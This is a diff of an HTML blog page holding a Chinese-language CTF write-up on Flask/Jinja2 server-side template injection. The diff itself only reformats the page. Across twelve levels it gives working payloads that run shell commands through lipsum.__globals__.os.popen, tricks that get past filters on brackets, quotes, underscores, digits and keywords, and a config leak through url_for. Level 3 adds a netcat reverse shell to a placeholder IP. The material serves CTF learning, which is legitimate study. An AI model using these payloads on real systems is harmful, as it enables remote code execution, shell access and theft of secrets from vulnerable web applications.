@@ -477,31 +477,31 @@
 <p>当你加载一个模块的时候，会在当前的全局命名空间中创建一个名为<code>os</code>的变量，指向这个<code>os</code>模块对象</p>
 <h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p><code>lipsum</code>是<code>jiaja</code>中的全局函数</p>
 <p>没有过滤，直接注入即可<br>pyload</p>
-<pre><code class="python">&#123;&#123;lipsum.__globals__.os.popen('ls -alh').read()&#125;&#125;
+<pre><code class="lang-python">&#123;&#123;lipsum.__globals__.os.popen('ls -alh').read()&#125;&#125;
 </code></pre>
 <h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>过滤<code>&#123;&#123;&#125;&#125;</code></p>
-<p><img src="https://i0.hdslb.com/bfs/article/74140ead8e9113ba274118e6a506d93a290349942.png"></p>
-<p>可以用<code>&#123;%%&#125;</code><br><code>&#123;% ... %&#125; </code>用来标记语句，比如 if 语句，for 语句等<br>在里面可以执行print语句所以pyload就很简单了<br>pyload</p>
-<pre><code class="python">&#123;%print(lipsum.__globals__.os.popen('ls -alh').read())%&#125;
+<p><img src="https://i0.hdslb.com/bfs/article/74140ead8e9113ba274118e6a506d93a290349942.png" alt=""></p>
+<p>可以用<code>&#123;%%&#125;</code><br><code>&#123;% ... %&#125;</code>用来标记语句，比如 if 语句，for 语句等<br>在里面可以执行print语句所以pyload就很简单了<br>pyload</p>
+<pre><code class="lang-python">&#123;%print(lipsum.__globals__.os.popen('ls -alh').read())%&#125;
 </code></pre>
-<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p><img src="https://i0.hdslb.com/bfs/article/4bf08cb1c070fda87f90605b815671f7290349942.png"></p>
+<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p><img src="https://i0.hdslb.com/bfs/article/4bf08cb1c070fda87f90605b815671f7290349942.png" alt=""></p>
 <p>注入测试后发现是bool盲注，既然是bool盲注就得外带数据</p>
 <p>外带数据的思路一共有两种，一是dnslog外带数据，二是反弹shell，这里就用 反弹shell了，反弹shell需要一个公网ip</p>
-<pre><code class="python">&#123;&#123;lipsum.__globals__.os.popen('netcat xxx.xxx.xxx.xxx 2333 -e /bin/bash').read()&#125;&#125;
+<pre><code class="lang-python">&#123;&#123;lipsum.__globals__.os.popen('netcat xxx.xxx.xxx.xxx 2333 -e /bin/bash').read()&#125;&#125;
 </code></pre>
 <p>靶机没装netcat也没curl，所以这里连不上，知道思路就行了</p>
 <h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>过滤了<code>[]</code><br>我们指令本来也没用<code>[]</code>所以直接过了</p>
-<pre><code class="python">
+<pre><code class="lang-python">
 &#123;&#123;lipsum.__globals__.os.popen('ls -alh').read()&#125;&#125;
 </code></pre>
 <h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><p>过滤了单双引号</p>
 <p>用request模块注入</p>
-<pre><code class="python">
+<pre><code class="lang-python">
 url=&#39;http://node5.anna.nssctf.cn:28413/level/5?qwq=ls&#39;
 code=&#123;&#123;lipsum.__globals__.os.popen(request.args.qwq).read()&#125;&#125;
 </code></pre>
 <h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>过滤了下划线，那依然可以用request模块绕过</p>
-<pre><code class="python">
+<pre><code class="lang-python">
 
 url=&#39;http://node5.anna.nssctf.cn:28413/level/6?qwq=__globals__&#39;
 code=&#123;&#123;(lipsum|attr(request.args.qwq)).os.popen('ls').read()&#125;&#125;
@@ -516,56 +516,59 @@ code=&#123;&#123;(lipsum|attr(request.args.qwq)).os.popen('ls').read()&#125;&#12
 <p><code>&#123;&#123;lipsum|attr('__globals__')&#125;&#125;</code><br>可以正确查找globals属性，但是不能再使用<code>|attr(&#39;os&#39;)</code>,因为<code>os</code>是globals的一个键而不是一个属性</p>
 <p>可以用<code>[]</code>获取</p>
 <p>payload:</p>
-<pre><code class="python">&#123;&#123;(lipsum|attr('__globals__'))['os']|attr('popen')('ls')|attr('read')()&#125;&#125;
+<pre><code class="lang-python">&#123;&#123;(lipsum|attr('__globals__'))['os']|attr('popen')('ls')|attr('read')()&#125;&#125;
 </code></pre>
 <h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>这题是关键字过滤，而且也过滤了request</p>
 <p>可以用<code>+</code>拼接，可以用<code>~</code>拼接，也可以用关键字<code>reverse</code>逆转<br>这里用<code>+</code>拼接</p>
 <p>payload</p>
-<pre><code class="python">&#123;&#123;lipsum['__glob'+'als__']['o'+'s']['pop'+'en']('ls /').read()&#125;&#125;
+<pre><code class="lang-python">&#123;&#123;lipsum['__glob'+'als__']['o'+'s']['pop'+'en']('ls /').read()&#125;&#125;
 </code></pre>
 <h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>过滤了数字</p>
 <p>payload</p>
-<pre><code class="python">&#123;&#123;lipsum.__globals__.os.popen('ls -alh').read()&#125;&#125;
+<pre><code class="lang-python">&#123;&#123;lipsum.__globals__.os.popen('ls -alh').read()&#125;&#125;
 </code></pre>
 <h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><p>得到<code>config</code>配置文件</p>
 <p>一般情况下可以用<code>&#123;&#123;config&#125;&#125;</code>直接获得，但有时会过滤关键字，那么就可以用迂回的方式得到</p>
 <p>当被过滤时，可利用已加载内置函数或对象寻找被过滤字符串</p>
 <p>flask内置函数</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
-<th align="center">函数</th>
-<th align="center">作用</th>
+<th style="text-align:center">函数</th>
+<th style="text-align:center">作用</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">lipsum</td>
-<td align="center">可加载第三方库</td>
+<tbody>
+<tr>
+<td style="text-align:center">lipsum</td>
+<td style="text-align:center">可加载第三方库</td>
 </tr>
 <tr>
-<td align="center">url_for</td>
-<td align="center">可返回url路径</td>
+<td style="text-align:center">url_for</td>
+<td style="text-align:center">可返回url路径</td>
 </tr>
 <tr>
-<td align="center">get_flashed_message</td>
-<td align="center">可获取消息</td>
+<td style="text-align:center">get_flashed_message</td>
+<td style="text-align:center">可获取消息</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <p>使用内置函数调用current_app模块进而查看配置文件<br><code>current_app</code>可输出当前app(即flask)</p>
 <p>所以可以通过内置函数获得<code>current_app</code>进而获得<code>config</code></p>
 <p>payload:</p>
-<pre><code class="python">
+<pre><code class="lang-python">
 &#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;
-
 </code></pre>
 <h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><p>过滤了<code>.</code> <code>[]</code> <code>request</code> <code>&#39;</code> <code>&quot;</code></p>
 <p><code>join</code>关键字<br>返回一个字符串，该字符串是序列中字符串的串联。元素之间的分隔符默认为空字符串，可以使用可选参数定义字符串。(ps:如果对象是字典，则只拼接 <strong>键</strong> )</p>
 <p>payload</p>
-<pre><code class="python">
+<pre><code class="lang-python">
 &#123;% set getitem = dict(__getitem__=1)|join%&#125;&#123;%set kg = (&#123;&#125;|select()|string()|attr(getitem)(10))%&#125;&#123;% set globals=dict(__globals__=a)|join%&#125;&#123;% set os=dict(os=a)|join%&#125;&#123;% set payload=(dict(ls=a)|join)|join%&#125;&#123;% set popen=dict(popen=a)|join%&#125;&#123;% set read=dict(read=a)|join%&#125;&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()&#125;&#125;
 </code></pre>
 <h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><p>过滤 <code>&#39;</code> <code>&quot;</code> <code>_</code> <code>0-9</code> <code>.</code> <code>[ ]</code> <code>\</code> <code>空格</code></p>
-<pre><code class="python">
+<pre><code class="lang-python">
 &#123;% set nine = dict(aaaaaaaaa=a)|join|count%&#125;&#123;%set pop=dict(pop=a)|join%&#125;&#123;%set kg=(lipsum|string|list)|attr(pop)(nine)%&#125;&#123;%set eighteen=nine+nine%&#125;&#123;%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%&#125;&#123;%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%&#125;&#123;%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%&#125;&#123;% set os=dict(os=a)|join%&#125;&#123;% set popen=dict(popen=a)|join%&#125;&#123;% set payload=(dict(cat=cat)|join,kg,dict(flag=flag)|join)|join %&#125;&#123;% set read=dict(read=a)|join%&#125;&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()&#125;&#125;
 </code></pre>
 
